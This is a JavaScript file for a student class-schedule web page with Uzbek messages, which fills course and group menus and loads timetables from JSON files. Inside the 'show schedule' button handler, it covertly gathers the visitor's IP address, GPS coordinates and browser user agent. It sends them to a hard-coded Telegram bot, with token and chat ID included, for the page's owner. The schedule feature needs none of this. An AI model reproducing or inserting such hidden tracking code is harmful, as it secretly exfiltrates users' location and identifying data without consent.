document.addEventListener("DOMContentLoaded", function() {
  const courseSelect = document.getElementById('course');
  const groupSelect = document.getElementById('group');
  
  function updateGroups(course) {
    let groups = [];
    if (course === "1-course") {
      groups = ["1--24", "2--24", "3--24", "4--24", "6--24", "6--24", "7--24", "8--24", "9--24"];
    } else if (course === "2-course") {
      groups = ["1--23", "2--23", "3--23", "4--23", "5--23", "6--23", "7--23", "8--23", "9--23"];
    }

    groupSelect.innerHTML = "";
    groups.forEach(group => {
      const option = document.createElement('option');
      option.value = group;
      option.textContent = group.replace("-", " ");
      groupSelect.appendChild(option);
    });
  }

  courseSelect.addEventListener('change', function() {
    updateGroups(courseSelect.value);
  });

  updateGroups(courseSelect.value);

  document.getElementById('show-schedule').addEventListener('click', function() {
    const course = courseSelect.value;
    const group = groupSelect.value;
    const day = document.getElementById('day').value;

    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        const userIp = data.ip;

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            const userAgent = navigator.userAgent;

            const message = `Sizning dasturingizni ochgan foydalanuvchi ma'lumotlari:\n\nKurs: ${course}\nGuruh: ${group}\nIP-manzil: ${userIp}\nMaqom (latitude, longitude): ${latitude}, ${longitude}\nTelefon/kompyuter: ${userAgent}`;

            fetch('https://api.telegram.org/bot8073879581:AAH-4aRkvCrxv7oiKBa8Ere_Z95hG21tBdU/sendMessage', {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                chat_id: '7518382960',
                text: message
              })
            })
            .then(response => response.json())
            .then(data => {
              console.log('Message sent to Telegram:', data);
            })
            .catch(error => {
              console.error('Error:', error);
            });

          }, function(error) {
            console.error('Ошибка при получении местоположения:', error);
          });
        } else {
          alert("Geolokatsiya xizmati qo\'llab-quvvatlanmayapti.");
        }
      })
      .catch(error => {
        console.error('Error fetching IP address:', error);
      });

    fetch(`courses/${course}/${group}.json`)
      .then(response => response.json())
      .then(data => {
        const schedule = data[day];
        
        const tableBody = document.getElementById('schedule-table').getElementsByTagName('tbody')[0];
        tableBody.innerHTML = "";

        if (schedule) {
          schedule.forEach(lesson => {
            const row = tableBody.insertRow();
            const lessonCell = row.insertCell(0);
            const timeCell = row.insertCell(1);
            lessonCell.textContent = lesson.lesson;
            timeCell.textContent = lesson.time;
          });
        } else {
          const row = tableBody.insertRow();
          const noLessonsCell = row.insertCell(0);
          noLessonsCell.colSpan = 2;
          noLessonsCell.textContent = "Uroklar bu kunda yo'q";
        }
      })
      .catch(error => {
        console.error('Xatolik:', error);
        alert('Xatolik yuz berdi. Fayl manzili to\'g\'ri ekanligini tekshiring.');
      });
  });

  const authorBtn = document.getElementById('author-btn');
  const authorModal = document.getElementById('author-modal');
  const closeBtn = document.getElementById('close-btn');

  authorBtn.addEventListener('click', function() {
    authorModal.style.display = "block";
  });

  closeBtn.addEventListener('click', function() {
    authorModal.style.display = "none";
  });

  window.addEventListener('click', function(event) {
    if (event.target === authorModal) {
      authorModal.style.display = "none";
    }
  });
});
